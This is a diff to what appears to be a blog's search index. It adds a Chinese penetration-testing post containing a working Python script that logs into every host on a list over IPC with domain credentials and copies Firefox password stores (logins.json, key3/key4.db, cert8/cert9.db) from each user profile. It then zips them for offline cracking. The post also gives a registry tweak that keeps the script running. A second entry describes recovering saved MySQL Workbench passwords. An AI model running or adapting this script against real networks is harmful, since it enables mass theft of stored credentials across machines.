@@ -1,6 +1,18 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[批量IPC获取域内机器Firefox密码]]></title>
+    <url>%2F2019%2F09%2F06%2F%E6%89%B9%E9%87%8FIPC%E8%8E%B7%E5%8F%96%E5%9F%9F%E5%86%85%E6%9C%BA%E5%99%A8Firefox%E5%AF%86%E7%A0%81%2F</url>
+    <content type="text"><![CDATA[在渗透测试中，获取机器浏览器密码是一项必不可少的工作，但考虑在域环境下，机器数量多，一台台获取显然效率不够，于是用python写了个自动化脚本。 解密条件123低版本firefox：logins.json、key3.db、cert8.db高版本firefox：logins.json、key4.db、cert9.db其中logins.json是关键，没有它则获取不到浏览器密码 示例代码1234567891011121314151617181920212223242526272829303132333435363738import os,sysfrom threading import Threadimport zipfileuser = sys.argv[1]pwd = sys.argv[2]file_open=(&apos;C:\\Users\\public\\downloads\\host.txt&apos;)def file_name(): for host in open(file_open): host = host.strip(&apos;\n&apos;) os.system(&quot;net use \\\\%s %s /user:%s&quot;%(host,pwd,user)) for root, dirs, files in os.walk(&apos;\\\\%s\\c$\\users&apos;%host): try: for files in files: if files == &apos;logins.json&apos;: os.chdir(root) print (root+&quot;\\&quot;+&apos;logins.json&apos;) os.system(&quot;copy %s\\logins.json c:\\users\\public\\downloads\\logins.json%s&quot;%(root,host)) os.system(&quot;copy %s\\key3.db c:\\users\\public\\downloads\\key3.db%s&quot;%(root,host)) os.system(&quot;copy %s\\cert8.db c:\\users\\public\\downloads\\cert8.db%s&quot;%(root,host)) os.system(&quot;copy %s\\key4.db c:\\users\\public\\downloads\\key4.db%s&quot;%(root,host)) os.system(&quot;copy %s\\cert9.db c:\\users\\public\\downloads\\cert9.db%s&quot;%(root,host)) os.system(&quot;net use \\\\%s /del&quot;%host) except: pass finally: zipDir(&apos;C:\\Users\\public\\downloads&apos;,&apos;C:\\Users\\public\\Documents\\key.zip&apos;)def zipDir(dirpath,outFullName): zip = zipfile.ZipFile(outFullName,&quot;w&quot;,zipfile.ZIP_DEFLATED) for root, dirs, files in os.walk(dirpath): fpath = root.replace(dirpath,&apos;&apos;) for files in files: zip.write(os.path.join(root,files),os.path.join(fpath,files)) zip.close()t=Thread(target=file_name)t.start() 使用说明：将host.txt放在C:\Users\public\downloads目录下，代码会循环判断机器中的logins.json文件，如存在，则批量获取密码配置文件并自动打包（C:\Users\public\Documents\下的key.zip文件）。为防止文件覆盖及标识文件，复制出来的key、cert会按照IP重命名，破解时自行改回。exp运行可能会存在报错：用作为当前目录的以上路径启动了CMD.EXE。UNC路径不受支持。默认值设为Windows目录。报错原因：网络路径下的问题。解决方法:reg add &quot;hkey_current_user\software\microsoft\command processor&quot; /v &quot;disableunccheck&quot; /t &quot;reg_dword&quot; /d &quot;1&quot; /f报错问题不大，并不影响使用。 效果 破解]]></content>
+      <categories>
+        <category>编程之道</category>
+      </categories>
+      <tags>
+        <tag>IPC</tag>
+        <tag>PYTHON</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[获取MySQL-Workbench本地保存密码]]></title>
     <url>%2F2019%2F06%2F19%2F%E8%8E%B7%E5%8F%96MySQL-Workbench%E6%9C%AC%E5%9C%B0%E4%BF%9D%E5%AD%98%E5%AF%86%E7%A0%81%2F</url>
     <content type="text"><![CDATA[平时用Navicat比较多，第一次使用MySQL-Workbench，目的是获取该软件保存在本地的链接信息(IP、端口、账号以及密码)。在网上找了一圈没有找到相关破解教程，于是自己研究了一下。 定位12测试版本：MySQL Workbench 8.0.16测试系统：win7 x64 安装过程就不说了，直接进入主题。凭猜测该软件会不会像Navicat一样，把链接信息写在注册表上，查询键值即可得到密文。而MySQL Workbench所定位的注册表是这样的：显然这里的键值并不是我想要的。第二个猜测点是该程序运行时会读取某个配置文件，所以用Procmon监视其的行为流程：先在Workbench里创建一个链接，然后开启监听，再返回到创建页面点击保存。点击保存后，得到的数据包如下：最后定位到了workbench_user_data.dat文件，用编辑器打开显示乱码，用IDA看也没找到什么。然后查了一下这文件名还真找到了解密方法，参考链接 效果直接是明文]]></content>
